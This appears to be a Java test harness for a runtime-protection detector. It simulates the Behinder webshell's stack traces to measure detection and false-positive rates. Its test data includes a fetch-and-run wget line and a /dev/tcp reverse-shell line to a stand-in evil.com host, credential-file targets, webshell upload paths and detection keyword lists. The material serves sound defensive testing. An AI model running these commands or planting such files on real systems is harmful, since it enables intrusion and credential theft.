package com.defense.rasp.testdata;

import com.defense.rasp.stackmodel.*;

/**
 * 冰蝎 (Behinder) Webshell 全链路模拟测试
 * 
 * 基于 behinder.txt 反编译分析，模拟真实 Behinder 的 7 种文件操作：
 *   show(), list(), download(), upload(), delete(), createFile(), execCommand()
 * 
 * 测试覆盖：
 *   1. 敏感文件读取 (web.xml, tomcat-users.xml, server.xml, /etc/passwd, id_rsa)
 *   2. 敏感目录列举 (WEB-INF, conf, /etc)
 *   3. 可疑文件写入 (JSP 写入 webapps, /tmp 写入)
 *   4. 文件删除 (日志, 配置文件)
 *   5. 命令执行 (whoami, cat, id, ifconfig, netstat)
 *   6. 误报测试 (正常 JSP 编译, 正常业务 IO)
 */

public class BehinderSimulationTest {

    // ============ 基于 behinder.txt 反编译分析的真实调用栈 ============

    /** FileOperation.show() — 查看文件内容 */
    static final String[][] SHOW_STACK = {
        {"org.apache.catalina.core.ApplicationFilterChain.doFilter"},
        {"net.rebeyond.behinder.core.DecryptFilter.doFilter"},
        {"net.rebeyond.behinder.payload.java.FileOperation.equals"},
        {"net.rebeyond.behinder.payload.java.FileOperation.show"},
        {"java.io.FileInputStream.<init>"}
    };

    /** FileOperation.list() — 列出目录内容 */
    static final String[][] LIST_STACK = {
        {"org.apache.catalina.core.ApplicationFilterChain.doFilter"},
        {"net.rebeyond.behinder.core.DecryptFilter.doFilter"},
        {"net.rebeyond.behinder.payload.java.FileOperation.equals"},
        {"net.rebeyond.behinder.payload.java.FileOperation.list"},
        {"java.io.File.list"}
    };

    /** FileOperation.download() — 下载文件 */
    static final String[][] DOWNLOAD_STACK = {
        {"org.apache.catalina.core.ApplicationFilterChain.doFilter"},
        {"net.rebeyond.behinder.core.DecryptFilter.doFilter"},
        {"net.rebeyond.behinder.payload.java.FileOperation.equals"},
        {"net.rebeyond.behinder.payload.java.FileOperation.download"},
        {"net.rebeyond.behinder.payload.java.FileOperation.downloadPart"},
        {"java.io.FileInputStream.<init>"}
    };

    /** FileOperation.upload() / updateFile() / append() — 上传/写入文件 */
    static final String[][] UPLOAD_STACK = {
        {"org.apache.catalina.core.ApplicationFilterChain.doFilter"},
        {"net.rebeyond.behinder.core.DecryptFilter.doFilter"},
        {"net.rebeyond.behinder.payload.java.FileOperation.equals"},
        {"net.rebeyond.behinder.payload.java.FileOperation.upload"},
        {"java.io.FileOutputStream.<init>"}
    };

    /** FileOperation.delete() — 删除文件 */
    static final String[][] DELETE_STACK = {
        {"org.apache.catalina.core.ApplicationFilterChain.doFilter"},
        {"net.rebeyond.behinder.core.DecryptFilter.doFilter"},
        {"net.rebeyond.behinder.payload.java.FileOperation.equals"},
        {"net.rebeyond.behinder.payload.java.FileOperation.delete"},
        {"java.io.File.delete"}
    };

    /** FileOperation.createFile() — 创建文件 */
    static final String[][] CREATE_STACK = {
        {"org.apache.catalina.core.ApplicationFilterChain.doFilter"},
        {"net.rebeyond.behinder.core.DecryptFilter.doFilter"},
        {"net.rebeyond.behinder.payload.java.FileOperation.equals"},
        {"net.rebeyond.behinder.payload.java.FileOperation.createFile"},
        {"java.io.FileOutputStream.<init>"}
    };

    /** FileOperation.renameFile() — 重命名 */
    static final String[][] RENAME_STACK = {
        {"org.apache.catalina.core.ApplicationFilterChain.doFilter"},
        {"net.rebeyond.behinder.core.DecryptFilter.doFilter"},
        {"net.rebeyond.behinder.payload.java.FileOperation.equals"},
        {"net.rebeyond.behinder.payload.java.FileOperation.renameFile"},
        {"java.io.File.renameTo"}
    };

    /** 反射调用变体 — 冰蝎通过 Method.invoke 间接调用 */
    static final String[][] REFLECT_STACK = {
        {"org.apache.catalina.core.ApplicationFilterChain.doFilter"},
        {"net.rebeyond.behinder.core.DecryptFilter.doFilter"},
        {"net.rebeyond.behinder.payload.java.FileOperation.equals"},
        {"java.lang.reflect.Method.invoke"},
        {"sun.reflect.DelegatingMethodAccessorImpl.invoke"},
        {"sun.reflect.NativeMethodAccessorImpl.invoke"},
        {"java.io.FileInputStream.<init>"}
    };

    /** FileOperation.execCommand() — 命令执行 */
    static final String[][] EXEC_STACK = {
        {"org.apache.catalina.core.ApplicationFilterChain.doFilter"},
        {"net.rebeyond.behinder.core.DecryptFilter.doFilter"},
        {"net.rebeyond.behinder.payload.java.FileOperation.equals"},
        {"net.rebeyond.behinder.payload.java.FileOperation.execCommand"},
        {"java.lang.Runtime.exec"}
    };

    // ============ 正常模式调用栈（学习基线用） ============

    /** 正常 HTTP 请求 */
    static final String[][] NORMAL_HTTP = {
        {"org.apache.catalina.core.ApplicationFilterChain.doFilter"},
        {"org.apache.catalina.servlets.DefaultServlet.service"},
        {"org.apache.catalina.servlets.DefaultServlet.serveResource"},
        {"java.io.FileInputStream.<init>"}
    };

    /** 正常 JSP 编译 */
    static final String[][] NORMAL_JSP_COMPILE = {
        {"org.apache.catalina.core.ApplicationFilterChain.doFilter"},
        {"org.apache.jasper.servlet.JspServlet.service"},
        {"org.apache.jasper.compiler.Compiler.compile"},
        {"org.apache.jasper.JspCompilationContext.createTagHandlerPool"},
        {"java.lang.ClassLoader.loadClass"}
    };

    /** 正常配置加载 */
    static final String[][] NORMAL_CONFIG = {
        {"org.apache.catalina.startup.Catalina.start"},
        {"org.apache.catalina.core.StandardServer.start"},
        {"org.apache.catalina.core.StandardService.start"},
        {"org.apache.catalina.core.StandardEngine.start"},
        {"java.io.FileInputStream.<init>"}
    };

    /** 正常应用 IO */
    static final String[][] NORMAL_APP_IO = {
        {"org.apache.catalina.core.ApplicationFilterChain.doFilter"},
        {"com.example.controller.FileController.download"},
        {"com.example.service.FileService.getFile"},
        {"java.io.FileInputStream.<init>"}
    };

    // ============ 敏感文件路径（模拟 Behinder 攻击目标） ============

    static final String[] CRITICAL_TARGETS = {
        "/opt/tomcat85/conf/web.xml",
        "/opt/tomcat85/conf/tomcat-users.xml",
        "/opt/tomcat85/conf/server.xml",
        "/etc/passwd",
        "/root/.ssh/id_rsa",
        "/opt/tomcat85/conf/context.xml",
        "/opt/tomcat85/conf/catalina.properties",
    };

    static final String[] HIGH_TARGETS = {
        "/app/config/application.properties",
        "/opt/tomcat85/webapps/ROOT/WEB-INF/web.xml",
        "/etc/ssh/sshd_config",
        "/app/.env",
        "/opt/tomcat85/conf/catalina.policy",
        "/app/ssl/server.keystore",
    };

    static final String[] LIST_TARGETS = {
        "/opt/tomcat85/conf",
        "/opt/tomcat85/webapps/ROOT/WEB-INF",
        "/etc",
        "/root/.ssh",
        "/opt/tomcat85/logs",
        "/opt/tomcat85/webapps",
    };

    static final String[] UPLOAD_TARGETS = {
        "/opt/tomcat85/webapps/ROOT/shell.jsp",
        "/opt/tomcat85/webapps/examples/cmd.jsp",
        "/tmp/payload.elf",
        "/opt/tomcat85/webapps/ROOT/WEB-INF/evil.class",
    };

    static final String[] DELETE_TARGETS = {
        "/opt/tomcat85/logs/catalina.out",
        "/opt/tomcat85/webapps/ROOT/WEB-INF/web.xml",
        "/var/log/tomcat/access_log.txt",
    };

    static final String[] COMMANDS = {
        "whoami",
        "id",
        "cat /etc/passwd",
        "ifconfig",
        "netstat -an",
        "ls -la /opt/tomcat85/conf",
        "cat /opt/tomcat85/conf/tomcat-users.xml",
        "find / -name web.xml",
        "wget http://evil.com/payload.sh -O /tmp/payload.sh",
        "bash -i >& /dev/tcp/evil.com/4444 0>&1",
    };

    static final String[] SAFE_COMMANDS = {
        "java -version",
        "echo 'test'",
        "date",
        "uptime",
    };

    public static void main(String[] args) {
        printBanner();

        int totalTests = 0;
        int totalDetections = 0;
        int totalFalsePositives = 0;

        // ===== 阶段 0: 基线学习 =====
        System.out.println("========================================");
        System.out.println("  阶段 0: 基线学习 (500 次正常调用)");
        System.out.println("========================================");
        BaselineLearningEngine.resetLearning();
        BaselineLearningEngine.setLearningDuration(300_000);
        learnBaseline(500);
        System.out.println("  指纹数: " + BaselineLearningEngine.getLearnedFingerprintCount());
        System.out.println("  转移图大小: " + BaselineLearningEngine.getTransitionGraphSize());

        // ===== 阶段 1: 文件读取检测 (show) =====
        System.out.println("\n========================================");
        System.out.println("  阶段 1: 文件读取检测 (FileOperation.show)");
        System.out.println("========================================");

        int[] result = testFileRead();
        totalTests += result[0];
        totalDetections += result[1];
        printSectionResult("文件读取", result[0], result[1]);

        // ===== 阶段 2: 目录列举检测 (list) =====
        System.out.println("\n========================================");
        System.out.println("  阶段 2: 目录列举检测 (FileOperation.list)");
        System.out.println("========================================");

        result = testDirList();
        totalTests += result[0];
        totalDetections += result[1];
        printSectionResult("目录列举", result[0], result[1]);

        // ===== 阶段 3: 文件写入检测 (upload/create) =====
        System.out.println("\n========================================");
        System.out.println("  阶段 3: 文件写入检测 (FileOperation.upload/createFile)");
        System.out.println("========================================");

        result = testFileWrite();
        totalTests += result[0];
        totalDetections += result[1];
        printSectionResult("文件写入", result[0], result[1]);

        // ===== 阶段 4: 文件删除检测 (delete) =====
        System.out.println("\n========================================");
        System.out.println("  阶段 4: 文件删除检测 (FileOperation.delete)");
        System.out.println("========================================");

        result = testFileDelete();
        totalTests += result[0];
        totalDetections += result[1];
        printSectionResult("文件删除", result[0], result[1]);

        // ===== 阶段 5: 命令执行检测 (execCommand) =====
        System.out.println("\n========================================");
        System.out.println("  阶段 5: 命令执行检测 (FileOperation.execCommand)");
        System.out.println("========================================");

        result = testCommandExec();
        totalTests += result[0];
        totalDetections += result[1];
        printSectionResult("命令执行", result[0], result[1]);

        // ===== 阶段 6: 反射调用变体 =====
        System.out.println("\n========================================");
        System.out.println("  阶段 6: 反射调用变体 (Method.invoke)");
        System.out.println("========================================");

        result = testReflectVariant();
        totalTests += result[0];
        totalDetections += result[1];
        printSectionResult("反射调用", result[0], result[1]);

        // ===== 阶段 7: 误报测试 =====
        System.out.println("\n========================================");
        System.out.println("  阶段 7: 误报测试 (正常业务流量)");
        System.out.println("========================================");

        totalFalsePositives = testFalsePositives();
        printSectionResult("误报测试", 100, 100 - totalFalsePositives);

        // ===== 总结 =====
        printSummary(totalTests, totalDetections, totalFalsePositives);
    }

    // ==================== 测试方法 ====================

    private static int[] testFileRead() {
        int tested = 0, detected = 0;

        // 关键目标 (should detect)
        String[][][] stacks = {SHOW_STACK, DOWNLOAD_STACK, REFLECT_STACK};
        for (String[][] stackTemplate : stacks) {
            for (String target : CRITICAL_TARGETS) {
                int score = computeFullScore(stackTemplate, target);
                tested++;
                if (score >= 50) detected++;
            }
        }

        // 高风险目标
        for (String target : HIGH_TARGETS) {
            int score = computeFullScore(SHOW_STACK, target);
            tested++;
            if (score >= 50) detected++;
        }

        return new int[]{tested, detected};
    }

    private static int[] testDirList() {
        int tested = 0, detected = 0;

        for (String target : LIST_TARGETS) {
            int score = computeFullScore(LIST_STACK, target);
            tested++;
            if (score >= 50) detected++;
        }

        return new int[]{tested, detected};
    }

    private static int[] testFileWrite() {
        int tested = 0, detected = 0;

        String[][][] stacks = {UPLOAD_STACK, CREATE_STACK};
        for (String[][] stackTemplate : stacks) {
            for (String target : UPLOAD_TARGETS) {
                int score = computeFullScore(stackTemplate, target);
                tested++;
                if (score >= 50) detected++;
            }
        }

        // 带反射的写入
        for (String target : UPLOAD_TARGETS) {
            int score = computeFullScore(REFLECT_STACK, target);
            tested++;
            if (score >= 50) detected++;
        }

        return new int[]{tested, detected};
    }

    private static int[] testFileDelete() {
        int tested = 0, detected = 0;

        for (String target : DELETE_TARGETS) {
            int score = computeFullScore(DELETE_STACK, target);
            tested++;
            if (score >= 50) detected++;
        }

        return new int[]{tested, detected};
    }

    private static int[] testCommandExec() {
        int tested = 0, detected = 0;

        // 危险命令
        for (String cmd : COMMANDS) {
            int score = computeExecScore(EXEC_STACK, cmd);
            tested++;
            if (score >= 50) detected++;
        }

        // 反射 + 命令执行
        String[][] reflectExec = {
            {"org.apache.catalina.core.ApplicationFilterChain.doFilter"},
            {"net.rebeyond.behinder.core.DecryptFilter.doFilter"},
            {"net.rebeyond.behinder.payload.java.FileOperation.equals"},
            {"java.lang.reflect.Method.invoke"},
            {"sun.reflect.DelegatingMethodAccessorImpl.invoke"},
            {"java.lang.Runtime.exec"}
        };
        for (String cmd : COMMANDS) {
            int score = computeExecScore(reflectExec, cmd);
            tested++;
            if (score >= 50) detected++;
        }

        return new int[]{tested, detected};
    }

    private static int[] testReflectVariant() {
        int tested = 0, detected = 0;

        // 反射读取关键文件
        for (String target : CRITICAL_TARGETS) {
            int score = computeFullScore(REFLECT_STACK, target);
            tested++;
            if (score >= 50) detected++;
        }

        // 反射列举目录
        String[][] reflectList = {
            {"org.apache.catalina.core.ApplicationFilterChain.doFilter"},
            {"net.rebeyond.behinder.core.DecryptFilter.doFilter"},
            {"net.rebeyond.behinder.payload.java.FileOperation.equals"},
            {"java.lang.reflect.Method.invoke"},
            {"sun.reflect.DelegatingMethodAccessorImpl.invoke"},
            {"java.io.File.list"}
        };
        for (String target : LIST_TARGETS) {
            int score = computeFullScore(reflectList, target);
            tested++;
            if (score >= 50) detected++;
        }

        return new int[]{tested, detected};
    }

    private static int testFalsePositives() {
        int falsePositives = 0;

        // 正常 HTTP 请求（非敏感文件）
        String[] safeFiles = {
            "/opt/tomcat85/webapps/examples/index.html",
            "/opt/tomcat85/webapps/ROOT/favicon.ico",
            "/opt/tomcat85/webapps/examples/images/tomcat.gif",
            "/opt/tomcat85/lib/catalina.jar",
            "/opt/tomcat85/lib/servlet-api.jar",
        };
        for (String f : safeFiles) {
            int score = computeFullScore(NORMAL_HTTP, f);
            if (score >= 50) falsePositives++;
        }

        // 正常 JSP 编译
        for (String f : safeFiles) {
            int score = computeFullScore(NORMAL_JSP_COMPILE, f);
            if (score >= 50) falsePositives++;
        }

        // 正常应用 IO
        String[] safeAppFiles = {
            "/app/data/user-avatar.jpg",
            "/app/data/report-2024.pdf",
            "/tmp/temp-upload-12345.tmp",
            "/var/log/app/application.log",
        };
        for (String f : safeAppFiles) {
            int score = computeFullScore(NORMAL_APP_IO, f);
            if (score >= 50) falsePositives++;
        }

        // 正常配置加载
        String[] configFiles = {
            "/opt/tomcat85/conf/logging.properties",
            "/opt/tomcat85/conf/catalina.properties",
        };
        for (String f : configFiles) {
            int score = computeFullScore(NORMAL_CONFIG, f);
            if (score >= 50) falsePositives++;
        }

        // 安全命令
        for (String cmd : SAFE_COMMANDS) {
            int score = computeExecScore(NORMAL_HTTP, cmd);
            if (score >= 50) falsePositives++;
        }

        return falsePositives;
    }

    // ==================== 评分计算 ====================

    private static int computeFullScore(String[][] stackTemplate, String filePath) {
        StackTraceElement[] stack = generateStack(stackTemplate);
        int baseScore = BaselineLearningEngine.forceDetectAnomaly(stack, filePath);
        int fileScore = analyzeFileSensitivityTest(filePath);
        int totalScore = Math.min(baseScore + fileScore, 100);

        if (totalScore >= 30) {
            String stackName = stackTemplate[stackTemplate.length - 1][0];
            System.out.printf("  [%s] %s -> 基础=%d 文件=%d 总分=%d%n",
                    totalScore >= 50 ? "DETECT" : "LOW   ",
                    filePath, baseScore, fileScore, totalScore);
        }

        return totalScore;
    }

    private static int computeExecScore(String[][] stackTemplate, String command) {
        StackTraceElement[] stack = generateStack(stackTemplate);
        int baseScore = BaselineLearningEngine.forceDetectAnomaly(stack, null);
        int cmdScore = analyzeCommandTest(command);
        int totalScore = Math.min(baseScore + cmdScore, 100);

        if (totalScore >= 30) {
            System.out.printf("  [%s] cmd='%s' -> 基础=%d 命令=%d 总分=%d%n",
                    totalScore >= 50 ? "DETECT" : "LOW   ",
                    command.length() > 40 ? command.substring(0, 40) + "..." : command,
                    baseScore, cmdScore, totalScore);
        }

        return totalScore;
    }

    private static int analyzeFileSensitivityTest(String filePath) {
        if (filePath == null) return 0;
        String lowerPath = filePath.toLowerCase();
        int score = 0;

        String[] criticalFiles = {
            "/etc/passwd", "/etc/shadow", "id_rsa", "authorized_keys",
            ".keystore", ".truststore", ".jks", ".p12", ".pfx"
        };
        for (String kw : criticalFiles) {
            if (lowerPath.contains(kw)) { score += 60; break; }
        }

        String[] highRiskFiles = {
            "tomcat-users.xml", "server.xml", "web.xml", "context.xml",
            "catalina.properties", "catalina.policy"
        };
        for (String kw : highRiskFiles) {
            if (lowerPath.contains(kw)) { score += 50; break; }
        }

        String[] credentialFiles = {
            ".key", ".pem", ".env", ".crt", ".cer", "private", "secret",
            "password", "credential", "token"
        };
        for (String kw : credentialFiles) {
            if (lowerPath.contains(kw)) { score += 40; break; }
        }

        String[] mediumRiskFiles = {
            "application.properties", "application.yml", "logback.xml",
            "log4j", "jdbc.properties", "mysql", "postgres", "redis",
            "rabbitmq", "kafka", "nacos", "consul"
        };
        for (String kw : mediumRiskFiles) {
            if (lowerPath.contains(kw)) { score += 30; break; }
        }

        if ((lowerPath.contains("config") || lowerPath.contains("conf")) &&
            (lowerPath.endsWith(".properties") || lowerPath.endsWith(".xml") ||
             lowerPath.endsWith(".yml") || lowerPath.endsWith(".yaml") ||
             lowerPath.endsWith(".conf") || lowerPath.endsWith(".policy") ||
             lowerPath.endsWith(".xsd"))) {
            score += 20;
        }

        return score;
    }

    private static int analyzeCommandTest(String command) {
        if (command == null || command.isEmpty()) return 0;
        String lowerCmd = command.toLowerCase();
        int score = 0;

        String[] dangerousCommands = {
            "cat", "type", "more", "head", "tail", "cp", "copy", "move", "mv", "rm", "del",
            "find", "grep", "awk", "sed", "vim", "vi", "nano",
            "powershell", "cmd", "bash", "sh", "zsh", "python", "perl", "ruby", "php",
            "curl", "wget", "nc", "netcat", "telnet", "chmod", "chown", "sudo", "su", "whoami"
        };

        String[] sensitiveFileKeywords = {
            "tomcat-users", "server.xml", "web.xml", "context.xml",
            ".properties", ".yml", ".env", ".key", ".pem", "passwd", "shadow",
            "mysql", "postgres", "redis", "rabbitmq", "kafka", "ssh/",
            "authorized_keys", "id_rsa", "/etc/passwd"
        };

        String[] suspiciousPatterns = {
            "|", ";", "&&", "||", "$(", "`", ">", "<", "base64", "decode",
            "bash -i", "python -c", "cmd.exe", "cmd /c", "powershell -c", "nc -e"
        };

        for (String cmd : dangerousCommands) {
            if (lowerCmd.contains(cmd)) { score += 10; }
        }
        for (String keyword : sensitiveFileKeywords) {
            if (lowerCmd.contains(keyword)) { score += 30; }
        }
        for (String pattern : suspiciousPatterns) {
            if (lowerCmd.contains(pattern)) { score += 15; }
        }

        return score;
    }

    // ==================== 工具方法 ====================

    private static void learnBaseline(int count) {
        String[][][] normalStacks = {NORMAL_HTTP, NORMAL_JSP_COMPILE, NORMAL_CONFIG, NORMAL_APP_IO};
        for (int i = 0; i < count; i++) {
            String[][] template = normalStacks[(int)(Math.random() * normalStacks.length)];
            StackTraceElement[] stack = generateStack(template);
            BaselineLearningEngine.learnNormalStack(stack, i < 100);
        }
    }

    private static StackTraceElement[] generateStack(String[][] template) {
        java.util.List<StackTraceElement> stack = new java.util.ArrayList<>();
        for (int i = template.length - 1; i >= 0; i--) {
            String method = template[i][0];
            int lastDot = method.lastIndexOf('.');
            String className = method.substring(0, lastDot);
            String methodName = method.substring(lastDot + 1);
            stack.add(new StackTraceElement(className, methodName,
                    className.substring(className.lastIndexOf('.') + 1) + ".java", 1));
        }
        return stack.toArray(new StackTraceElement[0]);
    }

    // ==================== 输出 ====================

    private static void printBanner() {
        System.out.println("╔══════════════════════════════════════════════════════════════╗");
        System.out.println("║       冰蝎 (Behinder) Webshell 全链路模拟测试               ║");
        System.out.println("║       基于 behinder.txt 反编译分析的真实调用栈              ║");
        System.out.println("╚══════════════════════════════════════════════════════════════╝");
    }

    private static void printSectionResult(String name, int tested, int detected) {
        double rate = tested > 0 ? (double) detected / tested * 100 : 0;
        System.out.printf("  %s: %d/%d (%.1f%%)%n", name, detected, tested, rate);
    }

    private static void printSummary(int totalTests, int totalDetections, int falsePositives) {
        double detectionRate = totalTests > 0 ? (double) totalDetections / totalTests * 100 : 0;

        System.out.println("\n╔══════════════════════════════════════════════════════════════╗");
        System.out.println("║                      测 试 总 结                            ║");
        System.out.println("╚══════════════════════════════════════════════════════════════╝");
        System.out.printf("  总攻击样本数: %d%n", totalTests);
        System.out.printf("  成功检测数:   %d%n", totalDetections);
        System.out.printf("  检测率:       %.1f%%%n", detectionRate);
        System.out.printf("  误报数:       %d%n", falsePositives);

        if (detectionRate >= 90 && falsePositives <= 5) {
            System.out.println("  评级: 优秀 — 高检测率低误报");
        } else if (detectionRate >= 75) {
            System.out.println("  评级: 良好 — 可投入使用");
        } else if (detectionRate >= 50) {
            System.out.println("  评级: 一般 — 需优化基线或评分权重");
        } else {
            System.out.println("  评级: 不足 — 需显著改进检测模型");
        }

        System.out.println();
    }
}
